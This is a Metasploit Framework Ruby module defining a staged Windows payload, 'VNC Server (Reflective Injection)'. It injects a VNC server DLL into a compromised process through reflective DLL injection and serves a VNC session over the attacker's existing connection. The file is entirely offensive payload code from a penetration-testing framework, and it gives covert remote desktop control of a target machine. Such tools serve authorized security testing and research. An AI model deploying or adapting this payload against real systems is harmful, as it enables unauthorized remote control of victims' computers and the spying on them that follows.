##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

# Copyright (c) 2008 Stephen Fewer of Harmony Security (www.harmonysecurity.com)

require 'msf/core'
require 'msf/core/payload/windows/reflectivedllinject'
require 'msf/base/sessions/vncinject'
require 'msf/base/sessions/vncinject_options'

###
#
# Injects the VNC server DLL (via Reflective Dll Injection) and runs it over the established connection.
#
###
module Metasploit3

  include Msf::Payload::Windows::ReflectiveDllInject
  include Msf::Sessions::VncInjectOptions

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'VNC Server (Reflective Injection)',
      'Description'   => 'Inject a VNC Dll via a reflective loader (staged)',
      'Author'        => [ 'sf' ],
      'Session'       => Msf::Sessions::VncInject ))

  end

  def library_path
    File.join(Msf::Config.data_directory, "vncdll.dll")
  end
end
